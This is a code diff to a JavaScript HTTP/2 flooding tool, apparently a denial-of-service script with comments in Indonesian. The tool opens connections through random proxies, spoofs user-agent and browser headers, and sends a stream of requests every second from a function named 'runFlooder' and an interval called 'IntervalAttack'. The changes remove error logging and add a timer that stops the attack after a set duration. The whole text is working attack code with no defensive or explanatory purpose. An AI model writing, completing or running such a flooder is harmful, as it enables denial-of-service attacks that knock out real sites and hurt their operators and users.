@@ -3021,7 +3021,6 @@ var hd={}
  //headers["Trailer"] = "Max-Forwards";
  headers["sec-fetch-user"] = "?1";
  headers["x-requested-with"] = "XMLHttpRequest";
- 
  function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
@@ -3034,10 +3033,7 @@ var hd={}
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
-        if (error) {
-            console.error("Proxy connection error:", error);
-            return;
-        }
+        if (error) return;
 
         connection.setKeepAlive(true, 600000);
 
@@ -3077,8 +3073,6 @@ var hd={}
             socket: connection,
         });
 
-        let IntervalAttack; // Variable untuk menyimpan interval
-
         client.settings({
             headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
             maxConcurrentStreams: 100,
@@ -3088,9 +3082,7 @@ var hd={}
         });
 
         client.on("connect", () => {
-            console.log("HTTP/2 client connected.");
-
-            IntervalAttack = setInterval(() => {
+            const IntervalAttack = setInterval(() => {
                 const dynHeaders = {
                     ...headers,
                     "user-agent": uap1 + randstr(12),
@@ -3111,35 +3103,24 @@ var hd={}
                     request.end();
                 }
             }, 1000);
+
+            // Pastikan interval berhenti saat waktu habis
+            setTimeout(() => {
+                clearInterval(IntervalAttack);
+                client.destroy();
+                connection.destroy();
+            }, args.time * 1000);
         });
 
         client.on("close", () => {
-            console.log("HTTP/2 client connection closed.");
-            clearInterval(IntervalAttack); // Bersihkan interval saat koneksi ditutup
             client.destroy();
             connection.destroy();
-        });
-
-        client.on("error", (err) => {
-            console.error("HTTP/2 client error:", err);
-            clearInterval(IntervalAttack); // Bersihkan interval jika terjadi error
-        });
-
-        tlsConn.on("error", (err) => {
-            console.error("TLS connection error:", err);
-        });
-
-        connection.on("error", (err) => {
-            console.error("Proxy connection error:", err);
+            return;
         });
     }), function (error, response, body) {};
 }
 
-const KillScript = () => {
-    console.log("Script execution time finished. Exiting...");
-    process.exit(1);
-};
+const KillScript = () => process.exit(1);
 
-console.log("Script will run for", args.time, "seconds.");
 setTimeout(KillScript, args.time * 1000);
  
